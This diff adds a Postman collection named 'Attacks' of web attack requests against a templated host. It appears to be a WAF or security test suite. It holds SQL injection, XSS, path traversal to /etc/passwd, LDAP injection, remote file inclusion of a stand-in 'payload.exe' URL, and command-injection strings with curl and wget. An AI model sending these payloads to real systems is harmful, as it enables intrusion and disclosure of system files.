@@ -1,0 +1,477 @@
+
+{
+	"info": {
+		"name": "Attacks",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+
+	},
+	"item": [
+		{
+			"name": "JSON Attacks",
+			"item": [
+				{
+					"name": "/api/v2/notesearch (SQL Inj) Copy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"%32%27%20%61%6e%64%20%27%31%27%3d%27%31\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/v2/notesearch (XSS) Copy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"<script>document.domain</script>\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/v2/notesearch (Traversal) Copy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"../../../../../../etc/passwd\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/v2/notesearch (LDAP Injection) Copy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"username=*)|(userPassword=&password=*)\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/v2/notesearch (RFI) Copy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"https://remote.file.com/payload.exe\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/v2/notesearch (PHP Python) Copy",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"setdatasourceusername=admin || setdatasourcepassword=*\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/v2/sysinfo/uname (OS Command) Copy",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"connection": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Referer",
+								"value": "https://dvws.darklab.co/admin.html",
+								"type": "text"
+							},
+							{
+								"key": "Connection",
+								"value": "close",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/sysinfo/uname;curl -D- localhost",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"sysinfo",
+								"uname;curl -D- localhost"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Attacks",
+			"item": [
+				{
+					"name": "HTTP Specific Attack in Parameter",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+								"type": "text"
+							}
+						],
+						"url": {
+							"raw": "https:///{{appname}}/?';wget",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								""
+							],
+							"query": [
+								{
+									"key": "';wget",
+									"value": null
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Directory Traversal beyond root",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+								"type": "text"
+							}
+						],
+						"url": {
+							"raw": "https:///{{appname}}/../../../../../etc/passwd",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"..",
+								"..",
+								"..",
+								"..",
+								"..",
+								"etc",
+								"passwd"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "XSS in Parameter",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/?<script>document.popup(bad.js)</script>",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								""
+							],
+							"query": [
+								{
+									"key": "<script>document.popup(bad.js)</script>",
+									"value": null
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "SQL in Parameter",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/?user=1%20AND%201=1",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								""
+							],
+							"query": [
+								{
+									"key": "user",
+									"value": "1%20AND%201=1"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "SQL in URL",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/index.html/1%20AND%201=1",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"index.html",
+								"1%20AND%201=1"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Remote File Inclusion (RFI)",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/?file=https://www.fbi.gov",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								""
+							],
+							"query": [
+								{
+									"key": "file",
+									"value": "https://www.fbi.gov"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Invalid Method/Verb",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "text"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "LDAP Injection in URL",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/`(&(uid=*)(password=*))`",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"`(&(uid=*)(password=*))`"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "appname",
+			"value": "www.example.com"
+		},
+		{
+			"key": "urlspace",
+			"value": "%20"
+		}
+	]
+}
